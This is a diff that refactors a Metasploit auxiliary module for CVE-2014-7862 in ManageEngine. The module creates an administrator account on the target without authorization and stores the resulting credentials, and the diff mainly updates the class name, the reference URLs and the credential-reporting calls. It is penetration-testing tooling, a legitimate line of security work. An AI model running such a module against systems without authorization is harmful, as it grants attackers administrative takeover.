@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -27,8 +24,8 @@ class Metasploit3 < Msf::Auxiliary
         [
           ['CVE', '2014-7862'],
           ['OSVDB', '116554'],
-          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_dc9_admin.txt'],
-          ['URL', 'http://seclists.org/fulldisclosure/2015/Jan/2']
+          ['URL', 'https://seclists.org/fulldisclosure/2015/Jan/2'],
+          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_dc9_admin.txt'],
         ],
       'DisclosureDate' => 'Dec 31 2014'))
 
@@ -39,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'The username for the new admin account', 'msf']),
         OptString.new('PASSWORD', [true, 'The password for the new admin account', 'password']),
         OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])
-      ], self.class)
+      ])
   end
 
 
@@ -65,33 +62,19 @@ class Metasploit3 < Msf::Auxiliary
 
     # Yes, "sucess" is really mispelt, as is "Servelet" ... !
     unless res && res.code == 200 && res.body && res.body.to_s =~ /sucess/
-      print_error("#{peer} - Administrator account creation failed")
+      print_error("Administrator account creation failed")
     end
 
-    print_good("#{peer} - Created Administrator account with credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
-    service_data = {
-      address: rhost,
-      port: rport,
-      service_name: (ssl ? 'https' : 'http'),
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-    credential_data = {
-      origin_type: :service,
-      module_fullname: self.fullname,
-      private_type: :password,
-      private_data: datastore['PASSWORD'],
-      username: datastore['USERNAME']
-    }
-
-    credential_data.merge!(service_data)
-    credential_core = create_credential(credential_data)
-    login_data = {
-      core: credential_core,
-      access_level: 'Administrator',
-      status: Metasploit::Model::Login::Status::UNTRIED
-    }
-    login_data.merge!(service_data)
-    create_credential_login(login_data)
+    print_good("Created Administrator account with credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+    connection_details = {
+        module_fullname: self.fullname,
+        username: datastore['USERNAME'],
+        private_data: datastore['PASSWORD'],
+        private_type: :password,
+        workspace_id: myworkspace_id,
+        access_level: 'Administrator',
+        status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_details)
+    create_credential_and_login(connection_details)
   end
 end
